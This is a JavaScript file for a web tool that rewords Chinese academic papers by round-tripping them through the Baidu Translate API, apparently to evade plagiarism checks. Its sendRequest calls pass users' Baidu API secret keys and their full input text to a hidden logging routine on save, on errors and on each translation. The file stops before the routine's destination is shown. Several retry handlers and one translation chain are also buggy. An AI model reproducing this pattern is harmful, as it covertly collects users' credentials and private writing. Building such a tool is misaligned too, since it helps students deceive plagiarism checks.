let to = $(".originData");
let from = $(".newData");
let from1 = $(".newData1");
let from2 = $(".newData2");
let from3 = $(".newData3");
let from4 = $(".newData4");
let from5 = $(".newData5");
let from6 = $(".newData6");
let from7 = $(".newData7");
let compare = $(".compareData");
let compare1 = $(".compareData1");
let compare2 = $(".compareData2");
let compare3 = $(".compareData3");
let compare4 = $(".compareData4");
let compare5 = $(".compareData5");
let compare6 = $(".compareData6");
let compare7 = $(".compareData7");
var appid = localStorage.getItem("appid1");
var key = localStorage.getItem("key1");
const url = 'https://api.fanyi.baidu.com/api/trans/vip/translate';
let timer = null;

$("#yourAppid").val(appid);
$("#yourKey").val(key);

if (!localStorage.getItem("appid1") || !localStorage.getItem("key1") || localStorage.getItem("appid1") == null ||
	localStorage.getItem("key1") == null) {
	showToast("&emsp;&emsp;<b>欢迎新来的小伙伴来访！</b><br/>&emsp;&emsp;现已推出<b>【免申请 API 体验 3 分钟】功能</b>和<b>【一键提取查重报告标红内容】功能</b>，欢迎点击右上角使用。<br/>&emsp;&emsp;如需使用降重功能请先点击右上角的【配置账号】！如果你不会配置的话，可以点击右上角的【使用帮助】！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)", 5000);
} else {
	setTimeout(() => {
		if (localStorage.getItem('sTimes') > 0) {
			showToast(`你还剩余${localStorage.getItem('sTimes')/1000}秒，现在继续体验！`, 3500);
			countTime1();
		}
	}, 5000)
	showToast(
		'&emsp;&emsp;欢迎老朋友' + appid + '，今天又是美好的一天，论文人加油啊！<br/>&emsp;&emsp;现已推出<b>【一键提取查重报告标红内容】功能</b>，欢迎点击右上角使用。<br/>&emsp;&emsp;如果你遇到了账号配置出错，大概率是因为百度那边服务器抽风了，所以你可以休息一会再尝试~也可以去查阅一下帮助，我已更新最新教程！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)',
		4000);
}


$("#saveBtn").click(() => {
	const fn = () => {
		let _appid = $("#yourAppid").val();
		let _key = $("#yourKey").val()
		if (!_appid || !_key || _appid == "null" || _key == "null" || _appid.match(/,"expire":/) !=
			null || _key.match(/,"expire":/) != null || _appid == "appid" || _key == "key" || _appid ==
			"123hk" || _key == "123hk") {
			showToast("请检查后重新输入！", 3500)
		} else {
			localStorage.setItem("appid1", _appid);
			localStorage.setItem("key1", _key);

			isCanUse(localStorage.getItem("appid1"), localStorage.getItem("key1"), "aa", "zh", "en");

			function isCanUse(check_Appid, check_Key, QUERY, TO, FROM) {
				const salt = (new Date()).getTime();
				const str1 = check_Appid + QUERY + salt + check_Key;
				const sign = MD5.main(str1);
				$.ajax({
					url,
					type: 'get',
					// async: true,
					// 跨域
					dataType: 'jsonp',
					contentType: "application/x-www-form-urlencoded; charset=utf-8",
					data: {
						q: QUERY,
						appid: check_Appid,
						salt: salt,
						from: FROM,
						to: TO,
						sign: sign,
					},
					success: (data) => {
						if (data.error_code == "52003") {
							showToast("<b>保存失败！</b>请检查后重新输入！解决不了的话加群反馈作者(QQ群:238223706)",
								4500);
							sendRequest(localStorage.getItem("appid1"), data.error_code + "：" + "上车失败 &&" + localStorage.getItem("key1"), 1);
							localStorage.removeItem("appid1");
							localStorage.removeItem("key1");
							$("#yourAppid").val("");
							$("#yourKey").val("");
							return;
						} else {
							showToast("<b>保存成功！</b>如果你在翻译降重的时候遇到了账号配置出错，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再重试，也可以去查阅一下帮助，我已更新最新教程！解决不了的话加群反馈作者(QQ群:238223706)",
								4500);
							$('#exampleModal').modal('hide');
							$('.modal-backdrop').css("z-index", "-10");
							$('body').css("padding-right", "");
							sendRequest(localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "上车了！", 4);

						}
					},
				})
			}
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
})

$("#deleteBtn").click(() => {
	const fn = () => {
		sendRequest(localStorage.getItem("appid1"), "下车了！", 5);
		localStorage.removeItem("appid1");
		localStorage.removeItem("key1");
		showToast("已删除...下次使用请重新保存！", 4000);
		$("#yourAppid").val("");
		$("#yourKey").val("");
		$('#exampleModal').modal('hide')
		$('.modal-backdrop').css("z-index", "-10");
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
})

$(".clear").click(() => {
	const fn = () => {
		$("#zifu").text("0");
		$(".tongji").detach();
		$(".originData").val("");
		$(".lead").text("此处将会显示翻译结果")
		$(".compareRes").text("此处将会显示对比结果")
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
})

var foamTip = true;
$(".translateBtn").click(() => {
	const fn = () => {
		var appid11 = localStorage.getItem("appid1");
		var key11 = localStorage.getItem("key1");
		if (!appid11 || !key11) {
			showToast("您未配置账号，请配置完账号再开始使用...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
		} else if (appid11 == "null" || key11 == "null" || appid11.match(/,"expire":/) != null || key11
			.match(/,"expire":/) != null || appid11 == "appid" || key11 == "key" || appid11 == "123hk" ||
			key11 == "123hk") {
			showToast("账号有误，请重新检查配置...解决不了的话加群反馈作者(QQ群:238223706)", 2500);
		} else if (to.val() == "") {
			showToast("你未输入要翻译的内容...", 2500);
		} else {
			var nTo = $("#zifu").text()
			if (foamTip == true && nTo >= 200) {
				setTimeout(() => {
					showToast("正在翻译中...请耐心等待", 2500);
				}, 2000);
				showToast("温馨提醒：您输入的内容过长，不过也没啥，就是想提醒一下，哈哈哈~", 2500);
				foamTip = false;
			} else {
				showToast("正在翻译中...请耐心等待", 2500);
			}
			sendRequest(appid11, key11 + "：" + to.val(), 2);
			translateMain(0);
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		$(".tongji").detach();
		fn();
		timer = null;
	}, 500);
})

var foamTip1 = true
$(".translateAndCompareBtn").click(() => {
	const fn = () => {
		var appid11 = localStorage.getItem("appid1");
		var key11 = localStorage.getItem("key1");
		if (!appid11 || !key11) {
			showToast("您未配置账号，请配置完账号再开始使用...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
		} else if (appid11 == "null" || key11 == "null" || appid11.match(/,"expire":/) != null || key11
			.match(/,"expire":/) != null || appid11 == "appid" || key11 == "key" || appid11 == "123hk" ||
			key11 == "123hk") {
			showToast("账号有误，请重新检查配置...解决不了的话加群反馈作者(QQ群:238223706)", 2500);
		} else if (to.val() == "") {
			showToast("你未输入要翻译的内容所以无法对比...", 2500);
		} else {
			var nTo = $("#zifu").text()
			if (foamTip1 == true && nTo >= 200) {
				setTimeout(() => {
					showToast("正在翻译中...请耐心等待", 2500);
				}, 2000);
				showToast("温馨提醒：您输入的内容过长，不过也没啥，就是想提醒一下，哈哈哈~", 2500);
				foamTip1 = false;
			} else {
				showToast("正在翻译中...请耐心等待", 2500);
			}
			sendRequest(appid11, key11 + "：" + to.val(), 2);
			translateMain(1);
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		$(".tongji").detach();
		fn();
		timer = null;
	}, 500);
})

$(".compare").click(() => {
	const fn = () => {
		if (to.val() == "") {
			showToast("你未输入要翻译的内容所以无法对比...", 2500);
		} else {
			showToast("正在对比...", 2500);
			compareMain();
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
})

$(".restart").on("click", function () {
	showToast("正在重试...", 2500);
	from.html("正在重试...");
	sendRequest(localStorage.getItem("appid1"), "正在重试...", 3);
	translateZeroFn();
});

// $(".restart1").on("click", function() {
// 	showToast("正在重试...", 2500);
// 	from1.html("正在重试...");
// sendRequest(localStorage.getItem("appid1"),"正在重试...",3)
// 	translateOneFn();
// });

$(".restart2").on("click", function () {
	showToast("正在重试...", 2500);
	from2.html("正在重试...");
	sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
	translateTwoFn();
});

$(".restart3").on("click", function () {
	showToast("正在重试...", 2500);
	from3.html("正在重试...");
	sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
	translateThreeFn();
});

$(".restart4").on("click", function () {
	showToast("正在重试...", 2500);
	from4.html("正在重试...");
	sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
	translateFourFn();
});

$(".restart5").on("click", function () {
	showToast("正在重试...", 2500);
	from5.html("正在重试...");
	sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
	translateFiveFn();
});

$(".restart6").on("click", function () {
	showToast("正在重试...", 2500);
	from6.html("正在重试...");
	sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
	translateFiveFn();
});
$(".restart7").on("click", function () {
	showToast("正在重试...", 2500);
	from7.html("正在重试...");
	sendRequest(localStorage.getItem("appid1"), "正在重试...", 3);
	translateFiveFn();
});

function translateZeroFn(fn = 0) {
	// zh-en-zh
	translateFn(to.val(), 'zh', 'en', (rs) => {
		if (rs !== "54003" && rs !== "") {
			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "zh", (rs) => {
				if (rs !== "54003" && rs !== "") {
					from.html(rs);
					from.css("color", "black");
					from.after("<p class='tongji'>共计：<span id='zifu1'>0</span>字符</p>");
					tongji(rs, "r");
					if (fn) {
						setTimeout(() => {
							compareMain("from");
						}, 1000);
					}
				} else {
					from.html('修改失败，请稍后重试......');
					from.css("color", "red");
					$(".restart").css("display", "inline-block");
					console.log("error-1:", rs);
					sendRequest(localStorage.getItem("appid1"), "error-1:" + rs, 1);
				}
			});
		} else {

			from.html('修改失败，请稍后重试......');
			from.css("color", "red");
			$(".restart").css("display", "inline-block")
			console.log("error:", rs);
			sendRequest(localStorage.getItem("appid1"), "error:" + rs, 1)
		}
	});
}

// function translateOneFn(fn = 0) {
// 	// zh-jp-zh
// 	translateFn(to.val(), "zh", "jp", (rs) => {
// 		if (rs !== "54003" && rs !== "") {
// 			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "jp", "zh", (rs) => {
// 				if (rs !== "54003" && rs !== "") {
// 					from1.html(rs);
// 					from1.css("color", "black");
// 					if (fn) {
// 						setTimeout(() => {
// 							compareMain("from1")
// 						}, 1000);
// 					}
// 				} else {
// 	if(rs== "54003"){
// 	showToast("修改失败")
// }
// 					from1.html("修改失败，请稍后重试......");
// 					from1.css("color", "red");
// 					$(".restart1").css("display", "inline-block")
// 					console.log("error1-1:", rs);
// 					sendRequest(localStorage.getItem("appid1"),"error1-1:"+rs,1)
// 				}
// 			});
// 		} else {
// if(rs== "54003"){
// 	showToast("修改失败")
// }
// 			from1.html("修改失败，请稍后重试......");
// 			from1.css("color", "red");
// 			$(".restart1").css("display", "inline-block")
// 			console.log("error1:", rs);
// 					sendRequest(localStorage.getItem("appid1"),"error1:"+rs,1)
// 		}
// 	})
// }

function translateTwoFn(fn = 0) {
	// zh-fra-zh
	translateFn(to.val(), "zh", "fra", (rs) => {
		if (rs !== "54003" && rs !== "") {
			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "zh", (rs) => {
				if (rs !== "54003" && rs !== "") {
					from2.html(rs);
					from2.css("color", "black");
					from2.after("<p class='tongji'>共计：<span id='zifu2'>0</span>字符</p>");
					tongji(rs, "r1");
					if (fn) {
						setTimeout(() => {
							compareMain("from2");
						}, 1000);
					}
				} else {

					from2.html("修改失败，请稍后重试......");
					from2.css("color", "red");
					$(".restart2").css("display", "inline-block")
					console.log("error2-1:", rs);
					sendRequest(localStorage.getItem("appid1"), "error2-1:" + rs, 1)
				}
			})
		} else {

			from2.html("修改失败，请稍后重试......");
			from2.css("color", "red");
			$(".restart2").css("display", "inline-block")
			console.log("error2:", rs);
			sendRequest(localStorage.getItem("appid1"), "error2:" + rs, 1)
		}
	});
}

function translateThreeFn(fn = 0) {
	// zh-ru-zh
	translateFn(to.val(), "zh", "ru", (rs) => {
		if (rs !== "54003" && rs !== "") {
			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "ru", "zh", (rs) => {
				if (rs !== "54003" && rs !== "") {
					from3.html(rs);
					from3.css("color", "black");
					from3.after("<p class='tongji'>共计：<span id='zifu3'>0</span>字符</p>");
					tongji(rs, "r2");
					if (fn) {
						setTimeout(() => {
							compareMain("from3")
						}, 1000);
					}
				} else {

					from3.html("修改失败，请稍后重试......");
					from3.css("color", "red");
					$(".restart3").css("display", "inline-block")
					console.log("error3-1:", rs);
					sendRequest(localStorage.getItem("appid1"), "error3-1:" + rs, 1)
				}
			})
		} else {

			from3.html("修改失败，请稍后重试......");
			from3.css("color", "red");
			$(".restart3").css("display", "inline-block")
			console.log("error3:", rs);
			sendRequest(localStorage.getItem("appid1"), "error3:" + rs, 1)
		}
	});
}

function translateFourFn(fn = 0) {
	// zh-spa-zh
	translateFn(to.val(), "zh", "spa", (rs) => {
		if (rs !== "54003" && rs !== "") {
			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "spa", "zh", (rs) => {
				if (rs !== "54003" && rs !== "") {
					from4.html(rs);
					from4.css("color", "black");
					from4.after("<p class='tongji'>共计：<span id='zifu4'>0</span>字符</p>");
					tongji(rs, "r3");
					if (fn) {
						setTimeout(() => {
							compareMain("from4")
						}, 1000);
					}
				} else {

					from4.html("修改失败，请稍后重试......");
					from4.css("color", "red");
					$(".restart4").css("display", "inline-block")
					console.log("error4-1:", rs);
					sendRequest(localStorage.getItem("appid1"), "error4-1:" + rs, 1)
				}
			})
		} else {

			from4.html("修改失败，请稍后重试......");
			from4.css("color", "red");
			$(".restart4").css("display", "inline-block")
			console.log("error4:", rs);
			sendRequest(localStorage.getItem("appid1"), "error4:" + rs, 1)
		}
	});
}

function translateFiveFn(fn = 0) {
	// zh-en-zh-ru-zh
	translateFn(to.val(), "zh", "en", (rs) => {
		if (rs !== "54003" && rs !== "") {
			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "zh", (rs) => {
				if (rs !== "54003" && rs !== "") {
					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "zh", "ru", (
						rs) => {
						if (rs !== "54003" && rs !== "") {
							translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
								"ru",
								"zh",
								(rs) => {
									if (rs !== "54003" && rs !== "") {
										from5.html(rs);
										from5.css("color", "black");
										from5.after(
											"<p class='tongji'>共计：<span id='zifu5'>0</span>字符</p>"
										);
										tongji(rs, "r4");
										if (fn) {
											setTimeout(() => {
												compareMain("from5")
											}, 1000);
										}
									} else {

										from5.html("修改失败，请稍后重试......");
										from5.css("color", "red");
										$(".restart5").css("display", "inline-block")
										console.log("error5-3:", rs);
										sendRequest(localStorage.getItem("appid1"),
											"error5-3:" + rs, 1)
									}
								});
						} else {

							from5.html("修改失败，请稍后重试......");
							from5.css("color", "red");
							$(".restart5").css("display", "inline-block")
							console.log("error5-2:", rs);
							sendRequest(localStorage.getItem("appid1"), "error5-2:" + rs,
								1)
						}
					});
				} else {

					from5.html("修改失败，请稍后重试......");
					from5.css("color", "red");
					$(".restart5").css("display", "inline-block")
					console.log("error5-1:", rs);
					sendRequest(localStorage.getItem("appid1"), "error5-1:" + rs, 1)
				}
			});
		} else {

			from5.html("修改失败，请稍后重试......");
			from5.css("color", "red");
			$(".restart5").css("display", "inline-block")
			console.log("error5:", rs);
			sendRequest(localStorage.getItem("appid1"), "error5:" + rs, 1)
		}
	});
}

function translateSixFn(fn = 0) {
	// zh-it-zh
	translateFn(to.val(), 'zh', 'it', (rs) => {
		if (rs !== "54003" && rs !== "") {
			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "it", "zh", (rs) => {
				if (rs !== "54003" && rs !== "") {
					from6.html(rs);
					from6.css("color", "black");
					from6.after("<p class='tongji'>共计：<span id='zifu6'>0</span>字符</p>");
					tongji(rs, "r5");
					if (fn) {
						setTimeout(() => {
							compareMain("from6")
						}, 1000);
					}
				} else {

					from6.html('修改失败，请稍后重试......');
					from6.css("color", "red");
					$(".restart").css("display", "inline-block")
					console.log("error6-1:", rs);
					sendRequest(localStorage.getItem("appid1"), "error6-1:" + rs, 1)
				}
			});
		} else {

			from6.html('修改失败，请稍后重试......');
			from6.css("color", "red");
			$(".restart").css("display", "inline-block")
			console.log("error6:", rs);
			sendRequest(localStorage.getItem("appid1"), "error6:" + rs, 1)
		}
	});
}


function translateSevenFn(fn = 0) {
	//zh-fra-en-pt-jp-zh 中 法 英 葡 日 中  
	translateFn(to.val(), "zh", "fra", (rs) => {
		if (rs !== "54003" && rs !== "") {
			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "en", (rs) => {
				if (rs !== "54003" && rs !== "") {
					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "pt", (
						rs) => {
						if (rs !== "54003" && rs !== "") {
							translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
								"pt", "jp", (rs) => {
									if (rs !== "54003" && rs !== "") {
										translateFn(to.val(), "jp", "zh", (rs) => {
											if (rs !== "54003" && rs !== "") {
												from7.html(rs);
												from7.css("color", "black");
												from7.after(
													"<p class='tongji'>共计：<span id='zifu7'>0</span>字符</p>"
												);
												tongji(rs, "r6");
												if (fn) {
													setTimeout(() => {
														compareMain(
															"from7")
													}, 1000);
												}
											} else {

												from7.html("修改失败，请稍后重试......");
												from7.css("color", "red");
												$(".restart5").css("display",
													"inline-block")
												console.log("error7-4:", rs);
												sendRequest(localStorage
													.getItem(
														"appid1"),
													"error7-4:" + rs, 1)
											}
										});
									} else {

										from7.html("修改失败，请稍后重试......");
										from7.css("color", "red");
										$(".restart5").css("display", "inline-block")
										console.log("error7-3:", rs);
										sendRequest(localStorage.getItem("appid1"),
											"error7-3:" + rs, 1)
									}
								});
						} else {

							from7.html("修改失败，请稍后重试......");
							from7.css("color", "red");
							$(".restart5").css("display", "inline-block")
							console.log("error7-2:", rs);
							sendRequest(localStorage.getItem("appid1"), "error7-2:" + rs,
								1)
						}
					});
				} else {

					from7.html("修改失败，请稍后重试......");
					from7.css("color", "red");
					$(".restart5").css("display", "inline-block")
					console.log("error7-1:", rs);
					sendRequest(localStorage.getItem("appid1"), "error7-1:" + rs + "", 1)
				}
			});
		} else {

			from7.html("修改失败，请稍后重试......");
			from7.css("color", "red");
			$(".restart5").css("display", "inline-block")
			console.log("error7:", rs);
			sendRequest(localStorage.getItem("appid1"), "error7:" + rs, 1)
		}
	});
}


function translateMain(fn = 0) {
	setTimeout(() => {
		translateSevenFn(fn);
	}, 1500, setTimeout(() => {
		translateSixFn(fn);
	}, 1500, setTimeout(() => {
		translateFiveFn(fn);
	}, 1500, setTimeout(() => {
		translateFourFn(fn);
	}, 1500, setTimeout(() => {
		translateThreeFn(fn);
	}, 1500, setTimeout(() => {
		translateTwoFn(fn);
	}, 1500, setTimeout(() => {
		// translateOneFn(fn);
	}, 1500, setTimeout(() => {
		translateZeroFn(fn);
	}, 1500))))))));

}

var showTip = 0;

function translateFn(QUERY, FROM, TO, callback) {
	const salt = (new Date()).getTime();
	const str1 = appid + QUERY + salt + key;
	const sign = MD5.main(str1);
	if (showTip < 4) {
		setTimeout(() => {
			$.ajax({
				url,
				type: 'get',
				// async: true,
				// 跨域
				dataType: 'jsonp',
				contentType: "application/x-www-form-urlencoded; charset=utf-8",
				data: {
					q: QUERY,
					appid: appid,
					salt: salt,
					from: FROM,
					to: TO,
					sign: sign,
				},
				success: (data) => {
					if (data.error_code == "52003") {
						showToast(
							"账号配置出错，请重新配置...如果你保存成功了还显示这条提示，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再重试...解决不了的话加群反馈作者(QQ群:238223706)",
							3000);
						sendRequest(localStorage.getItem("appid1"), data.error_code + "：" + "账号配置出错，请重新配置... &&" + localStorage.getItem("key1"), 1);
						showTip++;
						return;
					} else if (data.error_code == "54003") {
						showToast("由于你的API还未升级成高级版，所以出现了修改失败...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
						callback(data.error_code);
					} else {
						if (data.trans_result[0] != undefined) {
							callback(data.trans_result[0].dst)
						} else {
							return;
						}
					}
				},
				error: function (data) {
					alert("error:" + data.status);
				},
			})
		}, 1500);
	} else {
		showToast("不要太着急，请先休息几分钟，再刷新页面吧~", 5000);
	}
}

function showToast(msg, duration) {
	duration = isNaN(duration) ? 5000 : duration;
	var d = (new Date);
	//获取年份
	var years = d.getFullYear();
	//获取月份
	var months = d.getMonth() + 1;
	//获取日期
	var dates = d.getDate();
	//获取小时
	var hours = d.getHours();
	//获取分钟
	var minutes = d.getMinutes();
	//获取秒钟 
	var seconds = d.getSeconds();
	var nowTime = years + "/" + months + "/" + dates + " " + hours + ":" + minutes + ":" + seconds
	var m = document.createElement('div');
	var time = nowTime;
	var content = `<div class="position-fixed top-0 end-0 p-3" style="z-index: 1100">
	  <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
	    <div class="toast-header">
	      <i style="margin-right:0.15625rem;"class="bi bi-app-indicator"></i>
	      <strong class="me-auto">论文翻译降重助手</strong>
	      <small>` + time + `</small>
	      <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
	    </div>
	    <div class="toast-body">
			` + msg + `
	    </div>
	  </div>
	</div>`
	document.body.appendChild(m);
	m.innerHTML = content;
	var toastLiveExample = document.getElementById('liveToast')
	var toast = new bootstrap.Toast(toastLiveExample)
	toast.show();
	setTimeout(function () {
		var d = 0.5;
		m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d +
			's ease-in';
		m.style.opacity = '0';
		setTimeout(function () {
			toast.hide();
			document.body.removeChild(m);
		}, d * 1000);
	}, duration);
}

function compareMain(op) {
	if (from.text() !== "修改失败，请稍后重试......" && from.text() !== "" && op === "from") {
		compareFn(compare, to, from)
	}
	// if (from1.text() !== "修改失败，请稍后重试......" && from1.text() !== "" && op === "from1") {
	// 	compareFn(compare1, to, from1)
	// }
	if (from2.text() !== "修改失败，请稍后重试......" && from2.text() !== "" && op === "from2") {
		compareFn(compare2, to, from2)
	}
	if (from3.text() !== "修改失败，请稍后重试......" && from3.text() !== "" && op === "from3") {
		compareFn(compare3, to, from3)
	}
	if (from4.text() !== "修改失败，请稍后重试......" && from4.text() !== "" && op === "from4") {
		compareFn(compare4, to, from4)
	}
	if (from5.text() !== "修改失败，请稍后重试......" && from5.text() !== "" && op === "from5") {
		compareFn(compare5, to, from5)
	}
	if (from6.text() !== "修改失败，请稍后重试......" && from6.text() !== "" && op === "from6") {
		compareFn(compare6, to, from6)
	}
	if (from7.text() !== "修改失败，请稍后重试......" && from7.text() !== "" && op === "from7") {
		compareFn(compare7, to, from7)
	}
}

function compareFn(target, originData, newData) {
	target.html(eq({
		value1: newData.text(),
		value2: originData.val()
	}).value2)
}



function eq(op) {
	if (!op) {
		return op;
	}
	if (!op.eq_min) {
		op.eq_min = 3;
	}
	if (!op.eq_index) {
		op.eq_index = 5;
	}
	if (!op.value1 || !op.value2) {
		return op;
	}
	var ps = {
		v1_i: 0,
		v1_new_value: "",
		v2_i: 0,
		v2_new_value: ""
	};
	while (ps.v1_i < op.value1.length && ps.v2_i < op.value2.length) {
		if (op.value1[ps.v1_i] == op.value2[ps.v2_i]) {
			//ps.v1_new_value += op.value1[ps.v1_i].replace(/</g,"<").replace(">",">");
			ps.v2_new_value += op.value2[ps.v2_i].replace(/</g, "<").replace(">", ">");
			ps.v1_i += 1;
			ps.v2_i += 1;
			//值2增加的部分
			if (ps.v1_i >= op.value1.length) {
				ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
					/</g, "<").replace(
					">", ">") + "</del>";
				break;
			}
			//值1删除的部分
			if (ps.v2_i >= op.value2.length) {
				//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
				ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i).replace(
						/</g, "<")
					.replace(">", ">") + "</span>";
				break;
			}
		} else {
			ps.v1_index = ps.v1_i + 1;
			ps.v1_eq_length = 0;
			ps.v1_eq_max = 0;
			ps.v1_start = ps.v1_i + 1;
			while (ps.v1_index < op.value1.length) {
				if (op.value1[ps.v1_index] == op.value2[ps.v2_i + ps.v1_eq_length]) {
					ps.v1_eq_length += 1;
				} else if (ps.v1_eq_length > 0) {
					if (ps.v1_eq_max < ps.v1_eq_length) {
						ps.v1_eq_max = ps.v1_eq_length;
						ps.v1_start = ps.v1_index - ps.v1_eq_length;
					}
					ps.v1_eq_length = 0;
					break; //只寻找最近的
				}
				ps.v1_index += 1;
			}
			if (ps.v1_eq_max < ps.v1_eq_length) {
				ps.v1_eq_max = ps.v1_eq_length;
				ps.v1_start = ps.v1_index - ps.v1_eq_length;
			}

			ps.v2_index = ps.v2_i + 1;
			ps.v2_eq_length = 0;
			ps.v2_eq_max = 0;
			ps.v2_start = ps.v2_i + 1;
			while (ps.v2_index < op.value2.length) {
				if (
					op.value2[ps.v2_index] == op.value1[ps.v1_i + ps.v2_eq_length]
				) {
					ps.v2_eq_length += 1;
				} else if (ps.v2_eq_length > 0) {
					if (ps.v2_eq_max < ps.v2_eq_length) {
						ps.v2_eq_max = ps.v2_eq_length;
						ps.v2_start = ps.v2_index - ps.v2_eq_length;
					}
					ps.v1_eq_length = 0;
					break; //只寻找最近的
				}
				ps.v2_index += 1;
			}
			if (ps.v2_eq_max < ps.v2_eq_length) {
				ps.v2_eq_max = ps.v2_eq_length;
				ps.v2_start = ps.v2_index - ps.v2_eq_length;
			}
			if (
				ps.v1_eq_max < op.eq_min &&
				ps.v1_start - ps.v1_i > op.eq_index
			) {
				ps.v1_eq_max = 0;
			}
			if (
				ps.v2_eq_max < op.eq_min &&
				ps.v2_start - ps.v2_i > op.eq_index
			) {
				ps.v2_eq_max = 0;
			}
			if (ps.v1_eq_max == 0 && ps.v2_eq_max == 0) {
				//两个值的字不同
				//ps.v1_new_value += "<span style='" + op.value1_style + "'>不同的" + op.value1[ps.v1_i].replace(/</g,"<").replace(">",">") + "</span>";
				ps.v2_new_value += "<span style='color:green'>" + op.value1[ps.v1_i].replace(/</g,
					"<").replace(">",
					">") + "</span>";
				ps.v2_new_value += "<del style='color:red'>" + op.value2[ps.v2_i].replace(/</g, "<")
					.replace(">",
						">") + "</del>";
				ps.v1_i += 1;
				ps.v2_i += 1;

				if (ps.v1_i >= op.value1.length) {
					//值2增加的部分
					ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
							/</g, "<")
						.replace(">", ">") + "</del>";
					break;
				}
				if (ps.v2_i >= op.value2.length) {
					//值1删除的部分
					//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
					ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i)
						.replace(/</g, "<")
						.replace(">", ">") + "</span>";
					break;
				}
				//值1删除的
			} else if (ps.v1_eq_max > ps.v2_eq_max) {
				//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1删除的" + op.value1.substr(ps.v1_i, ps.v1_start - ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
				ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i, ps
						.v1_start - ps.v1_i)
					.replace(/</g, "<").replace(">", ">") + "</span>";
				ps.v1_i = ps.v1_start;
			} else {
				//值2增加的
				ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i, ps
						.v2_start - ps.v2_i)
					.replace(/</g, "<").replace(">", ">") + "</del>";
				ps.v2_i = ps.v2_start;
			}
		}
	}
	op.value1 = ps.v1_new_value;
	op.value2 = ps.v2_new_value;
	//有多个连着修改的放在一起
	var addRule = /<del style='color:red'>((?!<del).)+<\/del>/g;
	var deleteRule = /<span style='color:green'>((?!<span).)+<\/span>/g;
	var allRule =
		/(<span style='color:green'>((?!<span).)+<\/span><del style='color:red'>((?!<del).)+<\/del>){2,}/g;
	op.value2 = op.value2.replace(allRule, function (str) {
		var beforText = "",
			afterText = "";
		var beforeMatch = str.match(deleteRule);
		for (var i = 0; i < beforeMatch.length; i++) {
			var m = beforeMatch[i].match(deleteRule);
			beforText += RegExp.$1;
		}
		var afterMatch = str.match(addRule);
		for (var i = 0; i < afterMatch.length; i++) {
			var m = afterMatch[i].match(addRule);
			afterText += RegExp.$1;
		}
		return (
			"<span style='color:green'>" + beforText + "</span><del style='color:red'>" +
			afterText +
			"</del>"
		);
	});
	return op;
}

let fixedBtn = $(".fixed_btn");
window.onscroll = () => {
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		if (document.documentElement.scrollTop >= 400) {
			fixedBtn.css("display", 'block');
		} else {
			fixedBtn.css("display", 'none');
		}
		timer = null;
	}, 500);
};

function sendRequest(sendTitle, sendContent, sendType) {
	if (sendType == 1) {
		// 返回错误码
		title = '【出错】：' + sendTitle;
		content = '【错误码】：' + sendContent;
	} else if (sendType == 2) {
		// 请求成功
		title = '【成功】：' + sendTitle;
		content = '【正在翻译】：' + sendContent;
	} else if (sendType == 3) {
		// 翻译出错重试
		title = '【重试】：' + sendTitle;
		content = '【内容】：' + sendContent;
	} else if (sendType == 4) {
		// 上车了
		title = '【上车】：' + sendTitle;
		content = '【内容】：' + sendContent;
	} else if (sendType == 5) {
		// 下车了
		title = '【下车】：' + sendTitle;
		content = '【内容】：' + sendContent;
	} else if (sendType == 6) {
		// 白嫖成功
		title = "【白嫖成功】：" + sendTitle;
		content = "【内容】：" + sendContent;
